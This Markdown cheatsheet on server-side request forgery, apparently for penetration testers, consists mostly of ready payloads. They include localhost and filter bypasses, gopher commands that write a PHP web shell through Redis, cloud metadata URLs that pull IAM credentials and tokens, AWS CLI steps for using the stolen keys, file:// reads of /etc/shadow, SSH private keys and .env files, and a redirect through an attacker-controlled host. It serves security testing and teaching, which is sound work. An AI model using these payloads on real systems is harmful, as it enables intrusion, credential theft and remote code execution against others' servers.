# 🔒 SSRF Cheatsheet

> **Server-Side Request Forgery (SSRF)** — A comprehensive reference for security researchers and penetration testers.

---

## Table of Contents

- [Detection](#-detection)
- [URL & IP Bypasses](#-url--ip-bypasses)
- [Protocol Testing](#-protocol-testing)
- [Filter Bypasses](#-filter-bypasses)
- [Port Scanning](#-port-scanning)
- [Cloud Metadata Exploitation](#-cloud-metadata-exploitation)
- [Internal Service Exploitation](#-internal-service-exploitation)
- [Local File Access](#-local-file-access)
- [Data Exfiltration](#-data-exfiltration)
- [Tools](#-tools)

---

## 🔍 Detection

### Step 1 — Identify Vulnerable Parameters

Look for URL-accepting parameters in requests:

```
https://site.com/fetch?url=https://example.com
https://site.com/proxy?target=https://example.com
https://site.com/image?src=https://example.com/image.jpg
https://site.com/api/webhook?callback=https://example.com/hook
```

**Common parameter names to target:**

| Category | Parameter Names |
|----------|----------------|
| URL input | `url`, `uri`, `path`, `dest`, `destination` |
| Navigation | `redirect`, `target`, `link`, `nav` |
| Callbacks | `callback`, `webhook`, `fetch` |

### Step 2 — Verify with a Controlled Server

```bash
# Start a listener
python3 -m http.server 8000

# Send the SSRF payload
https://site.com/fetch?url=http://your-server.com:8000/test
```

If you see an incoming request in your server logs → **SSRF confirmed**.

### Step 3 — Test Internal Access

```
https://site.com/fetch?url=http://localhost/
https://site.com/fetch?url=http://127.0.0.1/
https://site.com/fetch?url=http://0.0.0.0/
```

> **Tip:** Use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) — replace the parameter value with your Collaborator URL and check for DNS/HTTP interactions.

---

## 🌐 URL & IP Bypasses

### Localhost Aliases

```
http://127.0.0.1
http://127.1
http://0.0.0.0
http://localhost
http://127.00.00.01
http://2130706433        # Decimal IP for 127.0.0.1
http://0x7f000001        # Hex IP
http://0177.0000.0000.0001  # Octal IP
http://[::1]             # IPv6 loopback
http://[::ffff:127.0.0.1]   # IPv4-mapped IPv6
```

### Internal IP Ranges

```
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

### IPv6

```
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[fe80::1]/
```

### DNS Rebinding

Point a domain to an allowed IP first, then switch DNS to an internal IP.

- Tool: [whonow](https://github.com/brannondorsey/whonow)

---

## 📡 Protocol Testing

### File Protocol

```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///c:/windows/win.ini
file://\/\/etc/passwd
```

### Dict Protocol (Redis / Memcached)

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```

### Gopher Protocol (Raw TCP)

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:3306/
```

### LDAP Protocol

```
ldap://127.0.0.1:389/
ldap://localhost:389/%0astats%0aquit
```

### FTP Protocol

```
ftp://127.0.0.1/
ftp://user:pass@internal-ftp/file.txt
```

### Protocol Case Variation

```
HTTP://127.0.0.1/
hTTp://127.0.0.1/
//127.0.0.1/      # Missing protocol
```

---

## 🛡️ Filter Bypasses

### Blacklist Bypass — Localhost

```
http://127.0.0.1/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://localhost/
http://2130706433/           # Decimal IP
http://0x7f.0x0.0x0.0x1/    # Hex IP
http://0177.0000.0000.0001/  # Octal IP
```

### URL Encoding

```
http://127.0.0.1/  →  http://%31%32%37%2e%30%2e%30%2e%31/
http://localhost/  →  http://%6c%6f%63%61%6c%68%6f%73%74/
```

### `@` Symbol Abuse

```
http://evil.com@127.0.0.1/
http://allowed.com@127.0.0.1/
http://allowed.com#@127.0.0.1/
```

### Subdomain Tricks

```
http://127.0.0.1.evil.com
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://127.0.0.1.sslip.io/
http://127.0.0.1.allowed-domain.com/
```

### Domain Bypass

```
http://127.0.0.1.com/
http://localhost.com/
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/     # Unicode IDN
http://127.0.0.①/           # Unicode digit
```

### Port Bypass

```
http://127.0.0.1:80@allowed.com/
http://127.0.0.1:3306@allowed.com/
http://allowed.com#@127.0.0.1:22/
```

### Open Redirect Chain

```
# If allowed-domain.com has an open redirect:
http://allowed-domain.com/redirect?url=http://169.254.169.254/

# Or host your own redirect:
http://your-server.com/redirect-to-metadata
# → Location: http://169.254.169.254/latest/meta-data/
```

---

## 🔌 Port Scanning

Test common internal services via SSRF:

| Port | Service |
|------|---------|
| `22` | SSH |
| `80` | HTTP |
| `443` | HTTPS |
| `3306` | MySQL |
| `5432` | PostgreSQL |
| `6379` | Redis |
| `8080` | Alt HTTP |
| `9200` | Elasticsearch |
| `11211` | Memcached |

**Example payloads:**

```
http://127.0.0.1:22/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:9200/
```

---

## ☁️ Cloud Metadata Exploitation

### AWS

```
# List available IAM roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract role credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# Instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Sample credential response:**

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

**Use with AWS CLI:**

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws s3 ls
aws ec2 describe-instances
aws iam get-user
```

### Azure

```
# Access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Google Cloud

```
# Requires header: Metadata-Flavor: Google

# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```

---

## ⚙️ Internal Service Exploitation

### Redis via Gopher (Write Web Shell)

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_SET%20shell%20"<?php%20system($_GET['cmd']);%20?>"
gopher://127.0.0.1:6379/_SAVE
```

**Full Gopher/Redis payload (URL-encoded):**

```
gopher://127.0.0.1:6379/_
*3
$3
SET
$5
shell
$30
<?php system($_GET['cmd']); ?>

*4
$6
CONFIG
$3
SET
$3
dir
$13
/var/www/html

*4
$6
CONFIG
$3
SET
$10
dbfilename
$9
shell.php

*1
$4
SAVE
```

### Memcached via Gopher

```
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:11211/_get%20admin_password
```

### SMTP via Gopher (Send Email)

```
gopher://127.0.0.1:25/_HELO%20attacker
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com
gopher://127.0.0.1:25/_RCPT%20TO:victim@target.com
gopher://127.0.0.1:25/_DATA
gopher://127.0.0.1:25/_Subject:%20SSRF%20Test
```

---

## 📁 Local File Access

### Linux

```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
```

### Windows

```
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/boot.ini
```

### Application Files

```
file:///var/www/html/config.php
file:///var/www/.env
file:///home/user/.ssh/id_rsa
```

---

## 🗂️ Data Exfiltration

### Application Config

```
file:///var/www/html/config.php
file:///var/www/.env
file:///etc/nginx/nginx.conf
```

### AWS Credentials on Disk

```
file:///home/ubuntu/.aws/credentials
file:///root/.aws/credentials
```

### Proc Filesystem

```
file:///proc/self/environ        # Environment variables
file:///proc/self/cmdline        # Command line arguments
file:///proc/self/cwd/config.php # CWD relative files
```

---

## 🛠️ Tools

### SSRFMap

```bash
# Basic file read
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws

# Port scanning through SSRF
python3 ssrfmap.py -r request.txt -p url -m portscan

# Redis exploitation
python3 ssrfmap.py -r request.txt -p url -m redis
```

### Nuclei

```bash
# Run all SSRF templates
nuclei -u https://target.com -t ssrf/

# Specific SSRF parameter check
nuclei -u https://target.com -t ssrf/ssrf-parameter.yaml

# Cloud metadata checks
nuclei -u https://target.com -t ssrf/aws-metadata.yaml
```

---

> ⚠️ **Disclaimer:** This document is intended for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.